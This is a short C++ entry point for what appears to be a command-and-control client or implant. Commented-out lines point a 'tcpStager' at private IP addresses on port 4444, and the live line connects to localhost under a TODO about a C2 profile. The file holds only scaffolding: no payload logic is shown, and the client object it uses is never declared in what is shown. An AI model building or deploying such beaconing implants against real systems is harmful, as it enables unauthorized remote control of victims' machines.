#include "Client.h"

int main()
{
	//Config config = loadConfig();
    //Client client(config);
    //tcpStager.run("172.18.245.234", "4444");
    //tcpStager.run("10.0.0.86", "4444");
    const char server_ip[] = "127.0.0.1";
    client.run(server_ip, "4444"); // TODO: add/replace with C2Profile Config param?

	/* MainLoop: 
	 * - setup socket
	 * - connect to server
	 * - client main loop
	 * - close connection
	 * */
    return 0;
}
